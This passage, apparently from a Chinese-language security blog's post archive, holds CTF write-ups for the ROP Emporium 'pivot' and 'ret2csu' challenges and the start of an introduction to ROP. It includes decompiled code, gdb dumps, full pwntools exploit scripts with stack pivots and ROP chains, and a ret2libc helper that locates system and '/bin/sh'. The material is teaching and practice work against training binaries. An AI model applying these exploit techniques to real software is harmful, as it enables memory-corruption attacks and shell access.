class="line">payload+=p64(pop_rdi)+p64(bss)+p64(print_file)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="fluff"><a href="#fluff" class="headerlink" title="fluff"></a>fluff</h1><h1 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h1><p>麻了，这道题可真给我难坏了。</p>
+<h2 id="函数-5"><a href="#函数-5" class="headerlink" title="函数"></a>函数</h2><h3 id="main函数-5"><a href="#main函数-5" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;pivot by ROP Emporium&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;x86_64\n&quot;</span>);</span><br><span class="line">  ptr = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000000</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Failed to request space for pivot stack&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  pwnme(ptr + <span class="number">16776960</span>);</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nExiting&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>主函数给我们申请的一个堆段，什么用我们暂且蒙古，多半是写入一段能get shell的汇编指令。</p>
+<h3 id="pwnme函数-4"><a href="#pwnme函数-4" class="headerlink" title="pwnme函数"></a>pwnme函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">pwnme</span><span class="params">(<span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Call ret2win() from libpivot&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The Old Gods kindly bestow upon you a place to pivot: %p\n&quot;</span>, a1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Send a ROP chain now and it will land there&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, a1, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Thank you!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now please send your stack smash&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现包含一个栈溢出漏洞，但太小了，能让我们构造的栈只有0x18个长度。根据题目，我们可知这题是个栈迁移题目。那么上面的堆段的用处应该是让我们写入一段指令达到栈迁移的效果。</p>
+<h3 id="uselessFunction函数"><a href="#uselessFunction函数" class="headerlink" title="uselessFunction函数"></a>uselessFunction函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">uselessFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  foothold_function();</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据提示，找到foothold_function()，这是个外联函数，外联库自然是我们下载的另一个.so文件。</p>
+<h3 id="foothold-function函数"><a href="#foothold-function函数" class="headerlink" title="foothold_function函数"></a>foothold_function函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">foothold_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据pwnme的提示，我们继续在库中找到ret2win()函数。</p>
+<h3 id="ret2win函数"><a href="#ret2win函数" class="headerlink" title="ret2win函数"></a>ret2win函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">ret2win</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Failed to open file: flag.txt&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">33</span>, stream);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这是一个后门函数，根据题目中的提示，最后我们能调用此函数即可。</p>
+<p>那么我们的初步思路就差不多构造好了：在pwnme函数中利用栈溢出，返回到malloc申请的堆段，然后执行堆段的代码实现栈迁移既更改rsp和rbp，迁移到后门函数所在的内存段拿到flag。</p>
+<p>但是看了别人的writeup后，解题过程实际上是我们先后将rsp和rbp进行了更改。在第一次输入中，我们构造rop链利用foothold_function()将rbp更改为此函数的地址，然后再根据偏移量将rax改为后门函数的指针，最后调用rax即可。在第二次输入中，我们改了rsp使其保存申请的堆空间的地址。</p>
+<h2 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">sh=process(<span class="string">&#x27;./pivot&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libpivot.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pivot&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rax_ret=<span class="number">0x04009bb</span></span><br><span class="line">xchg_rax_rsp_ret=<span class="number">0x04009bd</span></span><br><span class="line">pop_rbp_ret=<span class="number">0x04007c8</span></span><br><span class="line">mov_rax_rax_ret=<span class="number">0x04009c0</span></span><br><span class="line">call_rax=<span class="number">0x04006b0</span></span><br><span class="line">add_rax_rbp=<span class="number">0x04009c4</span></span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">foothold_func_plt=elf.plt[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line">foothold_func_got=elf.got[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line"></span><br><span class="line">offset=libc.symbols[<span class="string">&#x27;ret2win&#x27;</span>]-libc.symbols[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># print hex(offset)</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;The Old Gods kindly bestow upon you a place to pivot:&quot;</span>)</span><br><span class="line">a1_adr=<span class="built_in">int</span>(sh.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print hex(a1_adr)</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">payload=p64(foothold_func_plt)</span><br><span class="line">payload+=p64(pop_rax_ret)+p64(foothold_func_got)</span><br><span class="line">payload+=p64(mov_rax_rax_ret)</span><br><span class="line">payload+=p64(pop_rbp_ret)+p64(offset)</span><br><span class="line">payload+=p64(add_rax_rbp)</span><br><span class="line">payload+=p64(call_rax)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rax_ret)+p64(a1_adr)+p64(xchg_rax_rsp_ret)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br></pre></td></tr></table></figure>
+
+<p>说实话，不看别人的writeup我断然是解不了这题的，构造rop链的脑洞很大，利用起gadget也是毫不手软，胆子大。</p>
+<h2 id="做题时到疑问"><a href="#做题时到疑问" class="headerlink" title="做题时到疑问"></a>做题时到疑问</h2><p>我在第二次输入中并没有在最后的ret覆盖这个堆空间指针，为什么我们在执行完对rsp的操作后会执行我们构造的rop链呢？然后我就用gdb进行了一次调试，并在第二次输入前停止。</p>
+<p>输入前：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x7ffd40ae5458: 0x000000000040099b # rsp  0x00007ffd40ae5590</span><br><span class="line">0x7ffd40ae5468: 0x00007f20af91af10        0x0000000000000000</span><br><span class="line">0x7ffd40ae5478: 0x0000000000000000        0x0000000000000000</span><br><span class="line">0x7ffd40ae5488: 0x0000000000000000        0x00007ffd40ae54b0 # rbp</span><br><span class="line">0x7ffd40ae5498: 0x00000000004008cc        0x00007f20af91af10</span><br><span class="line">0x7ffd40ae54a8: 0x00007f20ae91b010        0x00000000004009d0</span><br></pre></td></tr></table></figure>
+
+<p>输入后：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x7ffd40ae5460: 0x00007ffd40ae5590 # rsp  0x00007f20af91af10</span><br><span class="line">0x7ffd40ae5470: 0x6161616161616161        0x6161616161616161</span><br><span class="line">0x7ffd40ae5480: 0x6161616161616161        0x6161616161616161</span><br><span class="line">0x7ffd40ae5490: 0x6161616161616161 # rbp  0x00000000004009bb</span><br><span class="line">0x7ffd40ae54a0: 0x00007f20af91af10        0x00000000004009bd</span><br><span class="line">0x7ffd40ae54b0: 0x00000000004009d0</span><br></pre></td></tr></table></figure>
+
+<p>发现执行完操作后我们接下来会执行0x4009D0，那么是否是这个0x4009D0的问题，我先做个实验。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x7ffd40ae5460: 0x00007ffd40ae5590 # rsp  0x00007f20af91af10</span><br><span class="line">0x7ffd40ae5470: 0x6161616161616161        0x6161616161616161</span><br><span class="line">0x7ffd40ae5480: 0x6161616161616161        0x6161616161616161</span><br><span class="line">0x7ffd40ae5490: 0x6161616161616161 # rbp  0x00000000004009bb</span><br><span class="line">0x7ffd40ae54a0: 0x00007f20af91af10        0x00000000004009bd</span><br><span class="line">0x7ffd40ae54b0: 0x00007f20af91af10</span><br></pre></td></tr></table></figure>
+
+<p>先将0x4009D0改为堆空间指针，然后继续运行程序，确实是拿到了flag，所以的确是这个0x4009D0特殊。所以我们来查看一下其对应的代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">.text:00000000004009D0                 push    r15</span><br><span class="line">.text:00000000004009D2                 push    r14</span><br><span class="line">.text:00000000004009D4                 mov     r15, rdx</span><br><span class="line">.text:00000000004009D7                 push    r13</span><br><span class="line">.text:00000000004009D9                 push    r12</span><br><span class="line">.text:00000000004009DB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004009E2                 push    rbp</span><br><span class="line">.text:00000000004009E3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004009EA                 push    rbx</span><br><span class="line">.text:00000000004009EB                 mov     r13d, edi</span><br><span class="line">.text:00000000004009EE                 mov     r14, rsi</span><br><span class="line">.text:00000000004009F1                 sub     rbp, r12</span><br><span class="line">.text:00000000004009F4                 sub     rsp, 8</span><br><span class="line">.text:00000000004009F8                 sar     rbp, 3</span><br><span class="line">.text:00000000004009FC                 call    _init_proc</span><br><span class="line">……</span><br></pre></td></tr></table></figure>
+
+<p>期间并没有对rax进行过更改，然后回调用_init_proc，</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">.init:00000000004006A0                 public _init_proc</span><br><span class="line">.init:00000000004006A0 _init_proc      proc near               ; CODE XREF: __libc_csu_init+2C↓p</span><br><span class="line">.init:00000000004006A0                                         ; DATA XREF: LOAD:0000000000400458↑o</span><br><span class="line">.init:00000000004006A0                 sub     rsp, 8          ; _init</span><br><span class="line">.init:00000000004006A4                 mov     rax, cs:__gmon_start___ptr</span><br><span class="line">.init:00000000004006AB                 test    rax, rax</span><br><span class="line">.init:00000000004006AE                 jz      short loc_4006B2</span><br><span class="line">.init:00000000004006B0                 call    rax ; __gmon_start__</span><br><span class="line">……</span><br></pre></td></tr></table></figure>
+
+<p>然后会调用rax保存的地址段，此时的rax保存的是我们构造的rop链。</p>
+<p>我不知道这样解释对不对，也许是正确的。</p>
+<h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><h2 id="函数-6"><a href="#函数-6" class="headerlink" title="函数"></a>函数</h2><h3 id="main函数-6"><a href="#main函数-6" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  pwnme(*(__int64 *)&amp;argc, (__int64)argv, (__int64)envp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="pwnme函数-5"><a href="#pwnme函数-5" class="headerlink" title="pwnme函数"></a>pwnme函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ret2csu by ROP Emporium&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;x86_64\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="usefulFunction函数-2"><a href="#usefulFunction函数-2" class="headerlink" title="usefulFunction函数"></a>usefulFunction函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">usefulFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ret2win(<span class="number">1LL</span>, <span class="number">2LL</span>, <span class="number">3LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="ret2win函数-1"><a href="#ret2win函数-1" class="headerlink" title="ret2win函数"></a>ret2win函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">ret2win</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  FILE *streama; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0xDEADBEEFDEADBEEF</span>LL &amp;&amp; a2 == <span class="number">0xCAFEBABECAFEBABE</span>LL &amp;&amp; a3 == <span class="number">0xD00DF00DD00DF00D</span>LL )</span><br><span class="line">  &#123;</span><br><span class="line">    stream = fopen(<span class="string">&quot;encrypted_flag.dat&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !stream )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Failed to open encrypted_flag.dat&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    g_buf = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x21</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !g_buf )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Could not allocate memory&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    g_buf = fgets(g_buf, <span class="number">33</span>, stream);</span><br><span class="line">    fclose(stream);</span><br><span class="line">    streama = fopen(<span class="string">&quot;key.dat&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !streama )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Failed to open key.dat&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">      g_buf[i] ^= fgetc(streama);</span><br><span class="line">    *(_QWORD *)(g_buf + <span class="number">4</span>) ^= <span class="number">0xDEADBEEFDEADBEEF</span>LL;</span><br><span class="line">    *(_QWORD *)(g_buf + <span class="number">12</span>) ^= <span class="number">0xCAFEBABECAFEBABE</span>LL;</span><br><span class="line">    *(_QWORD *)(g_buf + <span class="number">20</span>) ^= <span class="number">0xD00DF00DD00DF00D</span>LL;</span><br><span class="line">    <span class="built_in">puts</span>(g_buf);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Incorrect parameters&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到pwnme函数中存在栈溢出漏洞，我们调用ret2win即可拿到flag。</p>
+<p>但是ret2win对参数有要求，并且要变更的寄存器有rdx，所以要使用通用gadget。</p>
+<p>调用通用gadget时我们正常操作，由于通用gadget只能更改edi，所以我们在后面还得再执行一次pop_rdi，之后会遇到一个 call r12+1bx*8 。这是我的知识盲区了，按照网上别人的方法，我们可以利用_fini，用gdb查看动态变量来得到其指针然后赋值给r12，rbx赋值为0。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; disass _fini</span><br><span class="line">Dump of assembler code for function _fini:</span><br><span class="line">   0x00000000004006b4 &lt;+0&gt;: sub    rsp,0x8</span><br><span class="line">   0x00000000004006b8 &lt;+4&gt;: add    rsp,0x8</span><br><span class="line">   0x00000000004006bc &lt;+8&gt;: ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">……</span><br><span class="line">pwndbg&gt; x/10g &amp;_DYNAMIC</span><br><span class="line">0x600e00: 0x0000000000000001  0x0000000000000001</span><br><span class="line">0x600e10: 0x0000000000000001  0x0000000000000038</span><br><span class="line">0x600e20: 0x000000000000001d  0x0000000000000078</span><br><span class="line">0x600e30: 0x000000000000000c  0x00000000004004d0</span><br><span class="line">0x600e40: 0x000000000000000d  0x00000000004006b4</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>也就是0x600e48存储着_fini的地址。调用 _fini和其后续函数的操作是不会有任何影响的。</p>
+<h2 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level =<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&#x27;./ret2csu&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret2win=<span class="number">0x400510</span></span><br><span class="line">finit_adr=<span class="number">0x600e48</span></span><br><span class="line"></span><br><span class="line">ret=<span class="number">0x4004e6</span></span><br><span class="line">rop1=<span class="number">0x400680</span></span><br><span class="line">rop2=<span class="number">0x40069A</span></span><br><span class="line">pop_rdi=<span class="number">0x004006a3</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(rop2)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(finit_adr)</span><br><span class="line">payload+=p64(<span class="number">0xDEADBEEFDEADBEEF</span>)+p64(<span class="number">0xCAFEBABECAFEBABE</span>)+p64(<span class="number">0xD00DF00DD00DF00D</span>)</span><br><span class="line">payload+=p64(rop1)</span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">0xDEADBEEFDEADBEEF</span>)</span><br><span class="line">payload+=p64(ret2win)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br></pre></td></tr></table></figure>
+
+<p>写这道题时，我一度怀疑自己的gdb出问题了。同一串代码，gdb.attach()注释了就能拿到了flag，一用来调试依然会出错。</p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>pwn</tag>
+        <tag>writeup</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ROP介绍</title>
+    <url>/2022/03/04/ROP%E4%BB%8B%E7%BB%8D/</url>
+    <content><![CDATA[<p>简单介绍以下ROP攻击，主要以CTF WIki上的内容为骨架。</p>
+<span id="more"></span>
+
+<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>Return-oriented Programming(面向返回的编程)，也是我们常见的利用栈溢出漏洞的攻击方法。</p>
+<h3 id="核心思想"><a href="#核心思想" class="headerlink" title="核心思想"></a>核心思想</h3><p>当我们能控制程序流程时，我们会使用一些程序中可以利用的指令片段(称之为gadget)，这些指令片段均已<code>ret</code> 结尾。通过这些gadget的执行和跳转达到我们想要的结果，最终get shell。</p>
+<p>如何使用ROP，我也根据CTF Wiki来总结一下，但由于个人水平有限，仅记录一下基本和部分中级ROP。做题可以使用<a href="https://ropemporium.com/">ROP Emporium</a>上的题目，附上我以前写的<a href="http://110.42.161.158/2021/12/24/ROP-Emporium-64%E4%BD%8D/">ROP Emporium (64位)-writeup</a>。</p>
+<h3 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h3><p>主要是一些攻击思维，操作根据实际搭配使用。</p>
+<h4 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h4><p>程序保存在文件的文本段(.text)，而ret2text就是利用程序中已有的代码来进行攻击。如果我们知道敏感函数的地址，我们就可以利用栈溢出漏洞和gadget，来控制程序执行该函数。</p>
+<h4 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h4><p>控制程序执行shellcode代码，<strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码</strong>。但是必须的是，我们写入shellcode的地址需要可执行权限。</p>
+<h4 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h4><p>控制程序执行动态链接的libc中的函数，通常是利用栈溢出，改写return address为某个函数的plt表地址，或者函数的具体位置(存储在got表中)。并且由于常用来get shell的system函数一般不会用在程序中，所以利用其他函数泄露libc版本成为经常要做的操作。需要注意的是，动态链接具有<strong>延迟绑定机制</strong>，即需要函数执行过一次，got表中才会有该函数的地址。</p>
+<p>这里我放上自己的ret2libc.sublime-snippet，方便做题使用。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;snippet&gt;</span><br><span class="line">	&lt;content&gt;&lt;![CDATA[</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret2libc</span>(<span class="params">func,func_addr,module=<span class="number">1</span>,one_gadget_addr=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> module:</span><br><span class="line">        <span class="comment"># libc=ELF(libc_file)</span></span><br><span class="line">        libc=elf.libc</span><br><span class="line">        libc_base=func_addr-libc.sym[func]</span><br><span class="line">        sys_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        binsh=libc_base+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">        environ=libc_base+libc.sym[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    	<span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">    	libc=LibcSearcher(func,func_addr)</span><br><span class="line">    	libc_base=func_addr-libc.dump(func)</span><br><span class="line">        sys_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">        binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;libc_base&#x27;</span>:libc_base,<span class="string">&#x27;system&#x27;</span>:sys_addr,<span class="string">&#x27;binsh&#x27;</span>:binsh,<span class="string">&#x27;environ&#x27;</span>:environ&#125;</span><br><span class="line"></span><br><span class="line">libc=ret2libc($&#123;<span class="number">1</span>:func&#125;,$&#123;<span class="number">2</span>:func_addr&#125;)</span><br><span class="line">]]&gt;&lt;/content&gt;</span><br><span class="line">	&lt;!-- <span class="type">Optional</span>: <span class="type">Set</span> a tabTrigger to define how to trigger the snippet --&gt;</span><br><span class="line">	&lt;tabTrigger&gt;ret2libc&lt;/tabTrigger&gt;</span><br><span class="line">	&lt;!-- <span class="type">Optional</span>: <span class="type">Set</span> a scope to limit where the snippet will trigger --&gt;</span><br><span class="line">	&lt;!-- &lt;scope&gt;source.python&lt;/scope&gt; --&gt;</span><br><span class="line">&lt;/snippet&gt;</span><br></pre></td></tr></table></figure>
+
+<p>其中使用了pwnlib.elf模块。默认使用了本地的libc文件，如果使用的是下载的libc文件就把注释取消了将libc_file替换为文件路径即可。</p>
